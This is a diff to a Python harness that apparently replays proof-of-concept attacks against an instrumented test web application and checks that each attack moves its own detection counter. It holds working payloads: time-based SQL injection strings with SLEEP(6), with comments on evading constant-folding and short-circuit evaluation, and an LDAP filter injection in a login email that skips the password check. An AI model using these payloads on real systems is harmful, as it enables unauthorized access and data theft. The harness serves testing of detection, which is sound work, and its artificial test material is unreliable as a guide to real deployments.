@@ -43,7 +43,7 @@ Run it from the estate network, e.g.::
 
 Environment
 -----------
-    ADMIN_HOST           default web01                    estate-side name
+    ADMIN_HOST           default web01.<ADMIN_SITE_DOMAIN>  estate-side name
     ADMIN_PORT           default 8080
     ADMIN_CALLBACK_HOST  default probe.partner-relay.test  any name; the resolver answers
     TELEMETRY_ENDPOINT   default http://otel-collector:8900
@@ -66,7 +66,7 @@ import urllib.request
 import zipfile
 from pathlib import Path
 
-HOST = os.environ.get("ADMIN_HOST", "web01")
+HOST = os.environ.get("ADMIN_HOST", "web01." + os.environ.get("ADMIN_SITE_DOMAIN", "calderwood.example"))
 PORT = int(os.environ.get("ADMIN_PORT", "8080"))
 BASE = f"http://{HOST}:{PORT}"
 CALLBACK = os.environ.get("ADMIN_CALLBACK_HOST", "probe.partner-relay.test")
@@ -190,10 +190,16 @@ def establish() -> None:
 def poc_0001() -> None:
     """A window filter that carries SQL, and a statement that then takes six seconds.
 
-    The subquery is uncorrelated, so the server evaluates it once while planning rather
-    than once per row: the pause is six seconds whatever the table holds.
+    Two things about where this filter lands decide the payload. It is pasted into a
+    prefix match against the entry category, so the value in front of the injection has
+    to be a category this ledger really holds -- the engine stops at the first false
+    operand of the conjunction and a value that matches nothing never reaches the pause.
+    And the fragment closes with a trailing wildcard, so a payload ending in a plain
+    equality leaves a comparison that is constant false, the whole clause is folded away
+    before execution and again nothing runs. Ending on a prefix match instead leaves a
+    clause that is constant true.
     """
-    payload = "custom-" + RUN_TAG + "' AND (SELECT SLEEP(6)) AND 'a'='a"
+    payload = "freight_charge' AND (SELECT SLEEP(6)) AND 'a' LIKE 'a"
     analyst.request("GET", "/api/reports/ledger?window=" + urllib.parse.quote(payload),
                     timeout=60)
 
@@ -374,15 +380,22 @@ def poc_0019() -> None:
 
 def poc_0020() -> None:
     """A recovery reference that carries SQL, on an endpoint that answers identically."""
-    payload = "CW-40118' AND (SELECT SLEEP(6)) AND 'a'='a"
+    # A reference this ledger really holds, for the same reason as the ledger window:
+    # the conjunction stops at its first false operand, so a reference that matches
+    # nothing never reaches the pause.
+    payload = "CWF-1042' AND (SELECT SLEEP(6)) AND 'a'='a"
     Session("anonymous").json("POST", "/api/auth/recover", {"reference": payload}, timeout=60)
 
 
 def poc_0021() -> None:
     """An identifier that widens the sign-in filter so the secret is never compared."""
+    # The identifier opens the alternative that holds the secret clause; the closing
+    # bracket the filter still needs comes from the secret field, because the template
+    # closes exactly as many brackets as it opens and the search is rejected outright
+    # otherwise. The secret itself is still wrong, which is the whole point.
     Session("anonymous").json("POST", "/api/auth/login", {
         "email": "d.wolstenholme@calderwood.example)(|(uid=*",
-        "password": f"not-the-password-{RUN_TAG}",
+        "password": f"not-the-password-{RUN_TAG})",
     })
 
 
@@ -478,6 +491,37 @@ def api(method: str, path: str, body: dict | None = None):
     return json.loads(payload) if payload else None
 
 
+def collect(run_id: str, cursor: int, wanted: str,
+            settle: float = 2.0, timeout: float = 45.0) -> tuple[list[dict], int]:
+    """Everything recorded past `cursor`, waited for until `wanted` has gone quiet.
+
+    Windowing rather than totalling, because two entries here are properly reached by the
+    same request: the management surface answers a caller with no session whichever of
+    its revealing endpoints was asked for, so the log-file entry moves the management
+    counter as well as its own. Totalling would read that as the management sink firing
+    twice, which is the signature of a sink counting a payload -- the opposite of what is
+    happening. What has to be true is that each replay moves ITS OWN counter once.
+    """
+    events: list[dict] = []
+    last = cursor
+    seen_at: float | None = None
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        page = api("GET", f"/v1/runs/{run_id}/events?type=signal&after_seq={last}&limit=5000")
+        batch = page.get("events", []) if isinstance(page, dict) else []
+        if batch:
+            events.extend(batch)
+            last = max(int(e.get("seq") or last) for e in batch)
+            if seen_at is None and any(
+                    (e.get("payload") if isinstance(e.get("payload"), dict) else e).get("signal")
+                    == wanted for e in events):
+                seen_at = time.time()
+        if seen_at is not None and time.time() - seen_at >= settle:
+            break
+        time.sleep(0.25)
+    return events, last
+
+
 def wait_for_console(seconds: float = 120.0) -> bool:
     deadline = time.time() + seconds
     probe = Session("probe")
@@ -521,6 +565,20 @@ def main() -> int:
 
     establish()
 
+    # The identities are established before the first window opens, so the counters an
+    # ordinary sign-in legitimately moves do not land inside somebody else's window.
+    cursor = 0
+    if use_api:
+        time.sleep(2.0)
+        page = api("GET", f"/v1/runs/{run_id}/events?type=signal&limit=50000")
+        cursor = page.get("next_seq") if isinstance(page, dict) else 0
+        cursor = cursor if isinstance(cursor, int) else 0
+
+    counts: dict[str, int] = {}
+    details: dict[str, str] = {}
+    peerless: dict[str, int] = {}
+    seen_anywhere: set[str] = set()
+
     for ident, replay in POCS:
         print(f"  replaying {ident} ... ", end="", flush=True)
         started = time.time()
@@ -530,32 +588,31 @@ def main() -> int:
         except OSError as failed:
             print(f"FAILED to send: {failed}")
 
+        if not use_api:
+            continue
+
+        wanted = signals[ident]
+        window, cursor = collect(run_id, cursor, wanted)
+        for event in window:
+            record = (event.get("payload") if isinstance(event.get("payload"), dict) else event)
+            signal = record.get("signal")
+            if not signal:
+                continue
+            seen_anywhere.add(signal)
+            if signal != wanted:
+                continue
+            counts[signal] = counts.get(signal, 0) + 1
+            if not record.get("peer_ip"):
+                peerless[signal] = peerless.get(signal, 0) + 1
+            attributes = record.get("attributes") or record.get("evidence") or {}
+            if attributes.get("detail") and signal not in details:
+                details[signal] = attributes["detail"]
+
     if not use_api:
         print("replay done (no assertions)")
         return 0
 
-    # The asynchronous render and the extraction pool both finish after their responses.
-    print("waiting for the work that outlives its response ...")
-    time.sleep(6)
-
     api("POST", f"/v1/runs/{run_id}/close")
-    page = api("GET", f"/v1/runs/{run_id}/events?type=signal&limit=50000")
-    events = page.get("events", []) if isinstance(page, dict) else []
-
-    counts: dict[str, int] = {}
-    details: dict[str, str] = {}
-    peerless: dict[str, int] = {}
-    for event in events:
-        record = event.get("payload", event) if isinstance(event.get("payload"), dict) else event
-        signal = record.get("signal")
-        if not signal:
-            continue
-        counts[signal] = counts.get(signal, 0) + 1
-        if not record.get("peer_ip"):
-            peerless[signal] = peerless.get(signal, 0) + 1
-        attributes = record.get("attributes") or record.get("evidence") or {}
-        if attributes.get("detail") and signal not in details:
-            details[signal] = attributes["detail"]
 
     print()
     failures: list[str] = []
@@ -571,8 +628,8 @@ def main() -> int:
         if not ok:
             failures.append(ident)
 
-    for signal in sorted(set(counts) - set(by_signal)):
-        print(f"FAIL unexpected counter {signal} ({counts[signal]}) -- another target's?")
+    for signal in sorted(seen_anywhere - set(by_signal)):
+        print(f"FAIL unexpected counter {signal} -- another target's?")
         failures.append(signal)
 
     print()
